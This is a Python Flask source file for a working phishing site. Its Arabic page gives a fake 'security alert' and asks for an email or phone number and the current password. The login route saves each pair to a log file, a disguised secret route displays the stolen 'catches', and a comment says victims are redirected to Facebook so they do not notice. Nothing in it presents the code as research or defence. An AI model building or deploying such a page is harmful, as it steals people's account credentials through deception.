from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# Justification: واجهة هكر احترافية ومتناسقة مع الرموز
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: rgba(16, 16, 16, 0.9); padding: 30px; border-radius: 12px; border: 2px solid #0f0; box-shadow: 0 0 20px rgba(0,255,0,0.5); width: 90%; max-width: 400px; text-align: center; }
        .btn { background: #0f0; color: #000; border: none; border-radius: 6px; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; }
        input { width: 100%; padding: 12px; margin: 12px 0; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 6px; box-sizing: border-box; }
        ::placeholder { color: #0f0; opacity: 0.7; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color: #0f0;">تنبيه أمني مطوّر!</h2>
        <p>لقد رصدنا نشاطاً مريباً. يرجى تأكيد كلمة المرور للمتابعة.</p>
        <form action="/login" method="POST">
            <input type="text" name="u_name" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="u_pass" placeholder="كلمة المرور الحالية" required>
            <button type="submit" class="btn">تأكيد الهوية</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

# --- الرابط السري لرؤية الصيدات (تمويه الاسم) ---
@app.route('/fares_secret_logs_v2') # تمويه الرابط
def show_logs():
    if os.path.exists("log.txt"):
        with open("log.txt", "r") as f:
            data = f.read()
        return f"<pre>{data}</pre>"
    return "لا توجد صيدات بعد!"

@app.route('/login', methods=['POST'])
def login():
    # سحب الصيدة من الحقول
    user = request.form.get('u_name')
    password = request.form.get('u_pass')
    
    # Justification: حفظ البيانات في ملف نصي صامت
    if user and password:
        with open("log.txt", "a") as f:
            f.write(f"User: {user} | Pass: {password}\\n")
    
    # تحويل الضحية لموقع حقيقي باش ما يفيقش
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run()
